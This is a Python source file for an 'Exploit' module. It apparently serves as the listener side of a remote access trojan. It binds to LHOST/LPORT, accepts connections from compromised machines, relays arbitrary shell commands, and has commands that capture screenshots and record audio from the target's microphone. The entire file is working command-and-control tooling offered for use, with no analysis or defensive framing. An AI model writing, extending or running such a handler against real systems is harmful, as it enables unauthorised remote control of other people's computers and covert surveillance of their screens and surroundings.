import socket
import threading
class Exploit:
    def __init__(self):
        self.options = {
            "LHOST": "The local host IP address",
            "LPORT": "The local port number"
        }
        self.lhost = ""
        self.lport = 0  # Default to 0 or None
        self.server_socket = None
        self.client_socket = None
        self.client_address = None

    def set_option(self, option, value):
        if option == "LHOST":
            self.lhost = value
        elif option == "LPORT":
            try:
                self.lport = int(value)  # Convert value to integer
                print(f"Set LPORT to {self.lport}")
            except ValueError:
                print(f"Error: '{value}' is not a valid port number.")



    def handle_client(self, client_socket):
        self.client_socket = client_socket
        while True:
            try:
                command = input(f"session ({self.client_address})> ").strip()
                if command.lower() in ["exit", "quit"]:
                    self.client_socket.sendall(command.encode())
                    break
                elif command.lower() == "help":
                    self.show_help()
                elif command.lower() == "screenshot":
                    self.take_screenshot()
                elif command.lower() == "record_mic":
                    self.record_mic()
                else:
                    self.client_socket.sendall(command.encode())
                    response = self.client_socket.recv(4096).decode()
                    print(response)
            except Exception as e:
                print(f"Error: {e}")
                break

    def show_help(self):
        print("""
Available commands:
    help         - Show this help message
    screenshot   - Take a screenshot from the target machine
    record_mic   - Record audio from the target machine's microphone
    exit/quit    - Close the session
""")

    def take_screenshot(self):
        self.client_socket.sendall("screenshot".encode())
        with open("screenshot.png", "wb") as f:
            while True:
                data = self.client_socket.recv(4096)
                if data.endswith(b"EOF"):
                    f.write(data[:-3])
                    break
                f.write(data)
        print("Screenshot saved as 'screenshot.png'")

    def record_mic(self):
        self.client_socket.sendall("record_mic".encode())
        with open("recording.wav", "wb") as f:
            while True:
                data = self.client_socket.recv(4096)
                if data.endswith(b"EOF"):
                    f.write(data[:-3])
                    break
                f.write(data)
        print("Audio recording saved as 'recording.wav'")

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.lhost, self.lport))
        self.server_socket.listen(5)
        print(f"Listening on {self.lhost}:{self.lport}...")

        while True:
            client_socket, client_address = self.server_socket.accept()
            self.client_address = client_address
            print(f"Connection from {client_address}")
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_handler.start()
